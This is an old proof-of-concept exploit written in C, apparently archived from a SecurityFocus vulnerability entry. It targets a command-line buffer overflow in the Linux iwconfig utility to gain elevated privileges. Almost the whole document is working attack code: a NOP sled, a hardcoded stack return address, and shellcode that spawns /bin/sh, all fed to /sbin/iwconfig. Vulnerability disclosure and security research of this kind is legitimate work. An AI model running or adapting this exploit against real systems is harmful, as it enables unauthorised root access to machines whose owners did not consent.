// source: https://www.securityfocus.com/bid/8901/info

A problem has been identified in the iwconfig program when handling strings on the commandline. Because of this, a local attacker may be able to gain elevated privileges.

/*
 * (C) 2003 NrAziz
 * polygrithm_at_hotmail[DOT]com
 */

/*
 * Greetz to Mixter,gorny,rave..
 */

/*
 * Description:
 *              iwconfig configures a wireless network interface and is similar to ifconfig
 *  except that iwconfig configures wireless interfaces.
 * Vulnerability:
 *               Instead of giving the interface parameter when a large string is given
 * the buffer overflows :-)...
 */

/*
 * Yet another Proof Of Concept Xploit for 'iwconfig'
 */


#include <stdio.h>
#include <stdlib.h>

#define BUFF_SIZE 98
#define RET 0xbffffc3f

char shellcode[]=
"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";

int main(int argc,char **argv)
{

  int i;
  char *buff=(char *)malloc(sizeof(char)*BUFF_SIZE);

  for(i=0;i<BUFF_SIZE;i+=4)
    *(long *)&buff[i]=RET;

  for(i=0;i<BUFF_SIZE-strlen(shellcode)-12;i++)
    *(buff+i)=0x90;

  memcpy(buff+i,shellcode,strlen(shellcode));

  execl("/sbin/iwconfig","iwconfig",buff,(char *)NULL);

  return 0;
}